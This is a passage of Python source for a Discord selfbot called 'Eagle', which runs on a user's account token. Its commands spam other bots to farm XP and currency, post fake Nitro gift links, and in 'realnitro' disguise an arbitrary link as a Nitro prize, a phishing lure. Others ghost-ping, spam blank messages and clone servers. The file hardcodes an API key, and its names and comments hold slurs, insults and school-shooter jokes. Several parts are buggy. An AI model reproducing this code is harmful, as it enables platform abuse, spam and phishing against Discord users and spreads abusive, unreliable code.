    ]
    for field in depression:
        if field['value']:
            noitnevergetsold.add_field(name=field['name'], value=field['value'], inline=True)
    return await ctx.send(embed=noitnevergetsold)


@Eagle.command(aliases=['mee6', 'rank' 'mee6farm'])
async def fast(ctx):
    Eagle
    time.sleep(1)
    await ctx.send("lol")
    time.sleep(60)
    await ctx.send("bruh")
    time.sleep(60)
    await ctx.send(".")
    time.sleep(60)
    await ctx.send("hi")
    time.sleep(60)
    await ctx.send("e")
    time.sleep(60)
    await ctx.send("Message")
    time.sleep(60)
    await ctx.send(".")
    time.sleep(60)
    await ctx.send("hi")
    time.sleep(60)
    time.sleep(60)
    await ctx.send("Message")
    time.sleep(60)
    await ctx.send(".")
    time.sleep(60)
    await ctx.send("The Tsunami wave crashed against the raised houses AND GOT FUKDCIJPIJKODIJUDODX")
    time.sleep(60)
    while True:
        await ctx.send(".rank")
        break


def Nitro():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f'https://discord.gift/{code}'


@Eagle.command(aliases=["nitrogen"])
async def nitro(ctx):
    Eagle
    await ctx.send(Nitro())


@Eagle.command(aliases=['markasread', 'ack'])  # not my code lol
async def ignore(ctx):
    Eagle
    for guild in Eagle.guilds:
        await guild.ack()


clipz = [
    ":one:",
    ":two:",
    ":three:",
    ":four:",
    ":five:",
    ":six:"
]

guns = [
    (-1, -1),
    (0, -1),
    (1, -1),
    (-1, 0),
    (1, 0),
    (-1, 1),
    (0, 1),
    (1, 1)
]


# ok stop skidding pls

@Eagle.command()
async def minesweeper(ctx, size: int = 5):
    size = max(min(size, 8), 2)

    schoolshooter = [[random.randint(0, size - 1), random.randint(0, size - 1)] for x in range(int(size - 1))]
    activeshooter = lambda x, y: 0 <= x < size and 0 <= y < size
    terrorist = lambda x, y: [i for i in schoolshooter if i[0] == x and i[1] == y]
    duckonquack = "**Sexy Minesweeper :weary:**:\n"
    for y in range(size):
        for x in range(size):
            tile = "||{}||".format(chr(11036))
            if terrorist(x, y):
                tile = "||{}||".format(chr(128163))
            else:
                count = 0
                for xmod, ymod in guns:
                    if activeshooter(x + xmod, y + ymod) and terrorist(x + xmod, y + ymod):
                        count += 1
                if count != 0:
                    tile = "||{}||".format(clipz[count - 1])
            message += tile
        message += "\n"
    await ctx.send(duckonquack
                   )


@Eagle.command(aliases=['dankmemeruwu', 'ifyouarereadingthisyouareaskid'])
async def dankfarm(ctx):
    Eagle
    time.sleep(1)
    await ctx.send("pls hunt")
    time.sleep(1)
    await ctx.send("pls fish")
    time.sleep(1)
    await ctx.send("pls dig")
    time.sleep(1)
    await ctx.send("pls beg")
    time.sleep(40)
    while True:
        await ctx.send(".dankfarm")
        break


@Eagle.command(aliases=['plsfish', 'plshunt'])
async def pls(ctx):
    Eagle
    time.sleep(1)
    await ctx.send("pls hunt")
    time.sleep(1)
    await ctx.send("pls fish")
    time.sleep(1)
    await ctx.send("pls dig")
    time.sleep(1)
    await ctx.send("pls beg")
    time.sleep(40)
    while True:
        await ctx.send(".pls")
        break


@Eagle.command()
async def massunblock(ctx):
    print(Eagle.user.relationships)
    for relationship in Eagle.user.relationships:
        if relationship is discord.RelationshipType.blocked:
            print(relationship)
            await relationship.delete()
            print("Unblocked Everyone, Now friend stoned.eagle uwuw uwu uwuwuwuwuwuwuwuuu")
            while True:
                print("Sex")
                time.sleep(2)
                print("stoned rocks")
                break


@Eagle.command()
async def tweet(ctx, username: str = None, *, message: str = None):
    if username is None or message is None:
        await ctx.send("fuck is you gonna tweet????????")
        return
    async with aiohttp.ClientSession() as cs:
        async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
            res = await r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(str(res['message'])) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"Eagle_tweet.png"))
            except:
                await ctx.send(res['message'])


# nigga i said stop


@Eagle.command
async def daddy(ctx):
    await ctx.send({ctx.author})


@Eagle.command(aliases=["deepfry"])
async def fry(ctx, user: discord.Member = None):
    Eagle
    dogwifhat = "https://nekobot.xyz/api/imagegen?type=deepfry&image="
    if user is None:
        schoolshooters = str(ctx.author.avatar_url_as(format="png"))
        dogwifhat += schoolshooters
        r = requests.get(dogwifhat)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"eagle_fry.png"))
        except:
            await ctx.send(res['message'])
    else:
        sadness = str(user.avatar_url_as(format="png"))
        dogwifhat += sadness
        r = requests.get(dogwifhat)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"eagle_fry.png"))
        except:
            await ctx.send(res['message'])


@Eagle.command(aliases=["reversesearch", "anticatfish", "catfish"])
async def revpfp(ctx, user: discord.Member = None):
    myfuckingdick = ctx.author
    if user is None:
        user = myfuckingdick
    try:
        sex = discord.Embed(
            description=f"https://images.google.com/searchbyimage?image_url={user.avatar_url}, Heres The Users Supposable girlfriend ")
        await ctx.send(embed=sex)
    except Exception as sex:
        Eagle


@Eagle.command(aliases=["ghost", "ping"])
async def ghostping(ctx, *, args):
    await ctx.message.delete()
    Eagle
    await ctx.send(args, delete_after=0.1)


@Eagle.command(aliases=['pfp', 'avatar'])
async def av(ctx, *, user: discord.Member = None):
    format = "gif"
    user = user or ctx.author
    if user.is_avatar_animated() != True:
        format = "png"
    theavaterstupidretard = user.avatar_url_as(format=format if format != "gif" else None)
    async with aiohttp.ClientSession() as session:
        async with session.get(str(theavaterstupidretard)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as file:
        await ctx.send(file=discord.File(file, f"Avatar.{format}"))


@Eagle.command(aliases=["gifsearch", "searchgif"])
async def gif(ctx, query=None):
    Eagle
    if query is None:
        stonedeagleisasoontobeschoolshooter = requests.get(
            "https://api.giphy.com/v1/gifs/random?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&tag=&rating=R")
        youllgetoverit = stonedeagleisasoontobeschoolshooter.json()
        await ctx.send(youllgetoverit['data']['url'])

    else:
        r = requests.get(
            f"https://api.giphy.com/v1/gifs/search?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&q={query}&limit=1&offset=0&rating=R&lang=en")
        res = r.json()
        await ctx.send(res['data'][0]["url"])


# congrats, if yu see this your a Professional Retarded Skid, Heres your certificate: Suck My Fucking Dick - "stoned.eagle#0001" Signed
@Eagle.command(aliases=["porncomment", 'HOLYSHITSTOPKIDDINGSTUPIDRETARD'])
async def phcomment(ctx, user: str = None, *, args=None):
    endmylife = "https://nekobot.xyz/api/imagegen?type=phcomment&text=" + args + "&username=" + user + "&image=" + str(
        ctx.author.avatar_url_as(format="png"))
    depression = requests.get(endmylife)
    sad = depression.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(sad["message"]) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"eaglehubLOL.png"))
    except:
        await ctx.send(sad["message"])


@Eagle.command()
async def cs(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    ptsd = await Eagle.create_guild(ctx.message.guild.name)
    for channel in ptsd.channels:
        await channel.delete()
    for emoji in guild.emojis:
        if emoji.animated == True:
            r = requests.get(f"https://cdn.discordapp.com/emojis/{emoji.id}.gif", headers={'user-agent': 'Mozilla/5.0'})
            if (r.status_code == 200):
                await ptsd.create_custom_emoji(name=emoji.name, image=r.content)
        else:
            r = requests.get(f"https://cdn.discordapp.com/emojis/{emoji.id}.png", headers={'user-agent': 'Mozilla/5.0'})
            if (r.status_code == 200):
                await ptsd.create_custom_emoji(name=emoji.name, image=r.content)
    for role in reversed(ptsd.roles):
        name = role.name
        permissions = role.permissions
        color = role.color
        newrole = await ptsd.create_role(name=name, color=color, permissions=permissions)
    for channel in guild.channels:
        name = channel.name
        position = channel.position
        category = str(channel.category)
        channeltype = str(channel.type)
        if channeltype == "category":
            newchannel = await ptsd.create_category(name=name)
    for channel in guild.channels:
        name = channel.name
        position = channel.position
        categoryname = str(channel.category)
        category = discord.utils.get(ptsd.categories, name=categoryname)
        channeltype = str(channel.type)
        if channeltype == "text":
            newchannel = await ptsd.create_text_channel(name=name, position=position, category=category)
        if channeltype == "voice":
            newchannel = await ptsd.create_voice_channel(name=name, position=position, category=category)
        if channeltype == "news":
            newchannel = await ptsd.create_text_channel(name=name, position=position, category=category)
            print(Fore.YELLOW + 'Command Used | clone server')


@Eagle.command()
async def realnitro(ctx, server):
    await ctx.message.delete()
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    nitro = f'https://discord.gift/{code}'
    embed = discord.Embed(description="        ")
    embed.add_field(name="GG poor boy aou won Nitro", value=f"[{nitro}]({server})")
    embed.set_image(
        url="https://cdn.discordapp.com/attachments/827008716263522314/830714076480798780/a9ng95vvs8c41.png")
    await ctx.send(embed=embed)


@Eagle.command()
async def blank(ctx):
    await ctx.send('ﾠﾠ' + '\n' * 400 + 'ﾠﾠ')
    time.sleep("4")  # i keep saying wait(*amount*) cuz i forget his aint lua lmfao


@Eagle.command()
async def blankspam(ctx):
    await ctx.send('ﾠﾠ' + '\n' * 400 + 'ﾠsﾠ')
    time.sleep("1")  # i keep saying wait(*amount*) cuz i forget his aint lua lmfao
    await ctx.send('ﾠﾠ' + '\n' * 400 + 'ﾠs')
    time.sleep("2")
    await ctx.send('ﾠﾠ' + '\n' * 400 + 'sﾠ')



@Eagle.command()
async def dadjoke(ctx):
    funnihumor = ['Error: Your Fatherless', 'Error: You dont have a dad lol', 'Error: Your a fucking retard',
                  'Error: Your dad left you', 'Error: Father is nonexistent']
    await ctx.send(random.choice(funnihumor))


@Eagle.command()
async def ascii(ctx, *, text):
    await ctx.message.delete()
    r = requests.get(f"http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}").text
    if len("```" + r + "```") > 2000:
        return
    await ctx.send(f"```{r}```")
    print(Fore.YELLOW + 'Command Used | ascii')


@Eagle.command()
async def reverse(ctx, *, message):
    message = message[::-1]
    await ctx.send(message)


# -------------------------------CAlLING------------------------------------------------
command()
print("What is your token")
# ------------------------------------Cog Loading-------------------------------------------


if __name__ == '__main__':
    Init()
